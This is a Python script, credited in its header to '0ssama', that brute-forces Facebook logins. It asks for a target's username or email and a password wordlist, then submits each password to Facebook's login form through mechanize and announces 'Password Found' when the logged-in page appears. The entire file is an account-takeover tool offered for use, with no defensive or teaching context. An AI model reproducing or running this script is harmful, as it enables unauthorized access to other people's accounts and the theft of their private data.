#!/usr/bin/python
# -*- coding: utf-8 -*-
        #############################################
        #                                           #
        #       Facebook BruteForce, by 0ssama      #
        #       Contact: 0ssama@protonmail.com      #
        #                                           #
        #############################################


import time
import os

os.system('clear')
time.sleep(0.5)
try:
    import mechanize
except ModuleNotFoundError:
    print ('[!] Module >Mechanize< Not Found!\n    Please install mechanize [pip install mechanize] before running the program.')
    exit()

time.sleep(0.5)
user = input('[?] Target Username/ID/Email >>> ')
time.sleep(0.8)
wrdlstFileName = input('\n[?] Wordlist Directory >>> ')
try:
    wordlist = open(wrdlstFileName, 'r')
except FileNotFoundError:
    print ('\n[!] File Not Found!')
    exit()

time.sleep(0.8)
print ('\n\nCracking '+user+' Now...')

time.sleep(1)
print ('\n#############################################\n')
for password in wordlist:
    if password == '' or password == ' ':
        pass
    else:
        try:
            browser = mechanize.Browser()
            browser.set_handle_robots(False)
            browser.addheaders = [('User-agent', "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36")]
            fb = browser.open('https://facebook.com')
            dos = open('Facebook-Log.txt', 'w+')
            browser.select_form(nr=0)
            browser.form['email'] = user
            browser.form['pass'] = password
            browser.method = 'POST'
            browser.submit()
            dos.write(browser.open("https://facebook.com").read().decode('utf-8'))
            dos.seek(0)
            text = dos.read()
            if text.find('home_icon', 0, len(text)) != -1:
                print ('[+] Password Found > '+password+'\n')
                dos.close()
                os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
                exit()
            else:
                print ("[!] Wrong Password! > "+str(password))
        except KeyboardInterrupt:
            print ('\n#############################################\n   Exiting..')
            dos.close()
            os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
            exit()

time.sleep(1)
print ('Sorry, none of the passswords in your wordlist is right.\n')
time.sleep(0.8)
dos.close()
os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
exit()
